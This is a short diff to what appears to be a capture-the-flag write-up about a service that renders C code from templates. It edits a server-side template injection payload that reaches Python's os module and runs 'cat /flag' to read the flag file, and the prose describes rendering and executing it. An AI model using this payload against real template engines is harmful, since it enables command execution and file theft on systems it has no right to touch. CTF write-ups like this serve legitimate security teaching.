@@ -1646,7 +1646,7 @@ $ curl -s -X POST -H "Content-Type: application/json" -d '{"template":"teddy.c.j
 For thinkering there are two options, we can either replace parts of the template or render it. Both operations are juicy! My approach was to insert a flag-leaking Python payload in one of the payloads, render it (making sure the result C code remains valid) then assemble and execute.
 
 ```python
-{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read().strip()}}
+request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read().strip()
 ```
 
 **Step 1 - Create a toy**
